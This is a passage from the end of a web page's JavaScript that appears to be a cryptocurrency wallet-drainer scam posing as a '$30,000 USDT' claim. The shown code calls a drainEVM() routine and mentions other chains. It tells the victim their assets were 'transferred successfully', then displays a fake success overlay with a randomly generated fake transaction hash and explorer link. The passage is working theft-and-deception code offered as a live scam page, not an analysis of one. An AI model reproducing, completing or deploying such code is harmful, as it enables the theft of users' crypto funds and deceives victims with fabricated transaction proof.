      } else { // Assume EVM if not Solana, Tron, Sui, or Aptos
        await drainEVM();
      }
      statusEl.innerHTML = "<span style='color:var(--success-green)'>Claiming process complete! $30,000 USDT (and all other assets) transferred successfully!</span>";
      showFakeSuccessScreen(); // Show the fake success screen
    } catch (e) {
      console.error("Overall claim error:", e);
      statusEl.innerHTML = "<span style='color:var(--error-red)'>Claim process failed. An error occurred during asset transfer. Please ensure gas and try again.</span>";
      if (txHashDiv.innerHTML === "Awaiting confirmations..." || txHashDiv.innerHTML === "") {
        txHashDiv.innerHTML = "Transaction(s) failed or rejected.";
        txHashDiv.style.color = "var(--error-red)";
        txHashDiv.style.display = "block";
      }
    } finally {
      claimBtn.disabled = false; // Allow retrying if it's not a full success
    }
  }

  // Show fake success screen
  function showFakeSuccessScreen() {
      successOverlay.style.display = 'flex';
      // Dynamically generate a fake transaction hash and explorer link
      const fakeTxHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
      const explorerBase = CHAIN_DATA[chainId]?.explorer || 'https://etherscan.io'; // Fallback explorer
      const link = `${explorerBase}/tx/${fakeTxHash}`;
      fakeExplorerLink.href = link;
  }

</script>
</body>
</html>
